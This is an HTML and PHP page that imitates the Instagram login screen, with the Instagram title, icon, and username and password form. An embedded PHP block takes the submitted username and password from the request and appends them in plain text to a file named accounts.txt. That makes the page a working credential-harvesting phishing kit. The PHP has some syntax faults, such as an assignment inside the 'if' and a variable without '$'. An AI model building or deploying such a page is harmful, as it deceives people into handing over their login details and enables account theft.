<!DOCTYPE html>
<html>
    <head>
        <title>Instagram</title>
        <link rel="stylesheet" href="css/myStyle.css">
        <meta http-equiv="content-type" content="charset=utf-8">
	<link rel="icon" type="image/x-icon" href="images/instaIcon.ico">
    </head>
<body>

<div class="container">
    <div class="box">
        <div class="heading"></div>
        <form class="login-form">
            <div class="field">
                <input id="username" type="name" placeholder="Phone number, username, or email" name="username" />
                <label for="username">Phone number, username, or email</label>
            </div>

            <div class="justShowbtn">
            <div class="field">
                <input id="password" type="password" placeholder="password" name="password"/>
                <label for="password">Password
                    
                </label>
                
            </div>
            <button class="login-button" title="login" name="submit">Log In</button>
            <div class="separator">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="other">
                <button class="fb-login-btn" type="button">
                    <i class="fa fa-facebook-official fb-icon"></i>
                    <span class="">Log in with Facebook</span>
                </button>
                <a class="forgot-password" href="#">Forgot password?</a>
            </div>
        </form>
    </div>
    <div class="box">
        <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
    </div>
</div>

<?php
ini_set('display_errors',0); 

if($_GET['username'] = ""){
    i = 0;}else{

$fileName2 = "accounts.txt";
$myFile2 = fopen($fileName2, "a") or die("Unable to open");
$myData  = $_GET['username']." : ".$_GET['password']."\n";
fwrite($myFile2, $myData);
fclose($myFile2);
    }
?>

</body>
</html>
